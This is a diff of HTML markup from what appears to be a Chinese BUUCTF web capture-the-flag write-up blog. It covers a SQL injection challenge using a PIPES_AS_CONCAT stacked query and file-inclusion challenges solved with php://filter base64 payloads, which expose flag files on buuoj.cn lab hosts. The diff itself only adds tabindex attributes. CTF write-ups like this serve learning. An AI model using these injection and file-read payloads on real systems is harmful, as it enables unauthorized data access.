-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select &#34;</span><span class="o">.</span><span class="nv">$post</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;||flag from Flag&#34;</span><span class="p">;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select &#34;</span><span class="o">.</span><span class="nv">$post</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;||flag from Flag&#34;</span><span class="p">;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>输入 *,1 的话，数据库查询语句为：</p>
@@ -919,7 +919,7 @@
 <p>网上说能扫出数据库，手法暂时不会，下面是源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -981,7 +981,7 @@
 </span><span class="lnt">60
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
     <span class="nx">session_start</span><span class="p">();</span>
     <span class="k">include_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
     <span class="nv">$post</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
@@ -1048,11 +1048,11 @@
 模式：<strong>pipes_as_concat</strong> 来实现oracle 的一些功能</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="p">;</span><span class="kt">set</span> <span class="n">sql_mode</span><span class="o">=</span><span class="n">PIPES_AS_CONCAT</span><span class="p">;</span><span class="k">select</span> <span class="mi">1</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="p">;</span><span class="kt">set</span><span class="w"> </span><span class="n">sql_mode</span><span class="o">=</span><span class="n">PIPES_AS_CONCAT</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="font-color0288d1-actf2020-新生赛includefont"><a href="#font-color0288d1-actf2020-新生赛includefont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1-actf2020-新生赛includefont" class="headings"><font color=#0288D1> 【ACTF2020 新生赛】Include</font></a></h2>
 <h3 id="font-colora020f0知识点php-伪协议利用font"><a href="#font-colora020f0知识点php-伪协议利用font" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0知识点php-伪协议利用font" class="headings"><font color=#A020F0>知识点：php 伪协议利用</font></a></h3>
@@ -1279,10 +1279,10 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 <p><strong>示例</strong>：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="p">[</span><span class="nx">文件名</span><span class="p">]</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="p">[</span><span class="nx">文件名</span><span class="p">]</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>读取文件源码（针对php文件需要base64编码）</p>
@@ -1291,19 +1291,19 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 <p><img src="/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210615193903774.png" alt="image-20210615193903774"></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;?file=flag.php&#34;</span><span class="o">&gt;</span><span class="nx">tips</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;?file=flag.php&#34;</span><span class="o">&gt;</span><span class="nx">tips</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>有一份 flag.php 文件,</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">4189</span><span class="nx">d5fb</span><span class="o">-</span><span class="mi">45</span><span class="nx">f5</span><span class="o">-</span><span class="mi">45</span><span class="nx">c1</span><span class="o">-</span><span class="mi">85</span><span class="nx">d3</span><span class="o">-</span><span class="nx">c1b320a8e58f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">4189</span><span class="nx">d5fb</span><span class="o">-</span><span class="mi">45</span><span class="nx">f5</span><span class="o">-</span><span class="mi">45</span><span class="nx">c1</span><span class="o">-</span><span class="mi">85</span><span class="nx">d3</span><span class="o">-</span><span class="nx">c1b320a8e58f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>打开后得到：</p>
@@ -1311,40 +1311,40 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 <p>从源码中查找信息未果，尝试 php://input，得到 input 被过滤了。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">4189</span><span class="nx">d5fb</span><span class="o">-</span><span class="mi">45</span><span class="nx">f5</span><span class="o">-</span><span class="mi">45</span><span class="nx">c1</span><span class="o">-</span><span class="mi">85</span><span class="nx">d3</span><span class="o">-</span><span class="nx">c1b320a8e58f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">input</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">4189</span><span class="nx">d5fb</span><span class="o">-</span><span class="mi">45</span><span class="nx">f5</span><span class="o">-</span><span class="mi">45</span><span class="nx">c1</span><span class="o">-</span><span class="mi">85</span><span class="nx">d3</span><span class="o">-</span><span class="nx">c1b320a8e58f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">input</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得到：hacker!</p>
 <p><strong>尝试 php://filter/read=convert.base64-encode/resource=flag.php 读取源码信息：</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">4189</span><span class="nx">d5fb</span><span class="o">-</span><span class="mi">45</span><span class="nx">f5</span><span class="o">-</span><span class="mi">45</span><span class="nx">c1</span><span class="o">-</span><span class="mi">85</span><span class="nx">d3</span><span class="o">-</span><span class="nx">c1b320a8e58f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="mi">4189</span><span class="nx">d5fb</span><span class="o">-</span><span class="mi">45</span><span class="nx">f5</span><span class="o">-</span><span class="mi">45</span><span class="nx">c1</span><span class="o">-</span><span class="mi">85</span><span class="nx">d3</span><span class="o">-</span><span class="nx">c1b320a8e58f</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得到base64加密结果：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-txt" data-lang="txt">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MjNlNGNhN2QtYWYyMS00ZGUzLTgzYWQtMjY4MzMyNDY2ZjE0fQo=
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MjNlNGNhN2QtYWYyMS00ZGUzLTgzYWQtMjY4MzMyNDY2ZjE0fQo=
 </code></pre></td></tr></table></div>
 </div>
 </div><p>解密得到：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
 <span class="n">echo</span> <span class="s2">&#34;Can you find out the flag?&#34;</span><span class="p">;</span>
 <span class="o">//</span><span class="n">flag</span><span class="p">{</span><span class="mf">23e4</span><span class="n">ca7d</span><span class="o">-</span><span class="n">af21</span><span class="o">-</span><span class="mi">4</span><span class="n">de3</span><span class="o">-</span><span class="mi">83</span><span class="n">ad</span><span class="o">-</span><span class="mi">268332466</span><span class="n">f14</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
@@ -1362,15 +1362,15 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 <p>执行查询 secr3t.php文件</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">db1821a0</span><span class="o">-</span><span class="mi">0845</span><span class="o">-</span><span class="mi">47</span><span class="nx">a0</span><span class="o">-</span><span class="mi">8331</span><span class="o">-</span><span class="nx">d23efdf7789d</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">secr3t</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">db1821a0</span><span class="o">-</span><span class="mi">0845</span><span class="o">-</span><span class="mi">47</span><span class="nx">a0</span><span class="o">-</span><span class="mi">8331</span><span class="o">-</span><span class="nx">d23efdf7789d</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">secr3t</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1387,7 +1387,7 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">secret</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">&gt;</span>
 <span class="o">&lt;?</span><span class="nx">php</span>
@@ -1409,7 +1409,7 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 <p>审计上面的php代码，发现这里存在 文件包含 ，且过滤了关键字 &quot;../&quot; ，&quot;input&quot;，&quot;data&quot;，&quot;tp&quot;，但没有过滤 &quot;<strong>filter</strong> &quot;</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1422,7 +1422,7 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
     <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
     <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
@@ -1437,24 +1437,24 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">利用php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="p">[</span><span class="nx">文件名</span><span class="p">]</span> <span class="nx">获取文件源码</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">利用php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="p">[</span><span class="nx">文件名</span><span class="p">]</span> <span class="nx">获取文件源码</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">db1821a0</span><span class="o">-</span><span class="mi">0845</span><span class="o">-</span><span class="mi">47</span><span class="nx">a0</span><span class="o">-</span><span class="mi">8331</span><span class="o">-</span><span class="nx">d23efdf7789d</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">secr3t</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">db1821a0</span><span class="o">-</span><span class="mi">0845</span><span class="o">-</span><span class="mi">47</span><span class="nx">a0</span><span class="o">-</span><span class="mi">8331</span><span class="o">-</span><span class="nx">d23efdf7789d</span><span class="o">.</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">/</span><span class="nx">secr3t</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">read</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得到base64加密的文件：</p>
-<pre><code class="language-php+HTML" data-lang="php+HTML">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7YWVjMzA3YTQtOGI3ZS00YzVkLWI0YmQtNGQ3NjM2ZmRhOGRmfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7YWVjMzA3YTQtOGI3ZS00YzVkLWI0YmQtNGQ3NjM2ZmRhOGRmfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
 </code></pre><p>解码得到：</p>
-<pre><code class="language-php+HTML" data-lang="php+HTML">&lt;!DOCTYPE html&gt;
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;!DOCTYPE html&gt;
 
 &lt;html&gt;
 
@@ -1482,11 +1482,11 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 <h3 id="font-colora020f0知识点命令执行font"><a href="#font-colora020f0知识点命令执行font" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0知识点命令执行font" class="headings"><font color=#A020F0>知识点：命令执行</font></a></h3>
